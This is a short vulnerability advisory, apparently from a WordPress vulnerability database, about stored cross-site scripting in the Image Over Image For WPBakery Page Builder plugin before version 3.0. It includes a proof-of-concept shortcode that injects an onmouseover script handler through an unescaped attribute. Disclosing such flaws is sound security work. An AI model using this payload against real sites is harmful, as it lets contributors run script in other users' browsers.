## WordPress Plugin Vulnerabilities

# Image Over Image For WPBakery Page Builder < 3.0 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in a page/post where the shortcode is embed, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks.

### Proof of Concept

[image\_over\_image\_vc ioi\_image\_effect='" onmouseover="alert(1)" style="background:red;width:100px;height:100px;display:block;"']
Other affected attribute: ioi\_url\_target
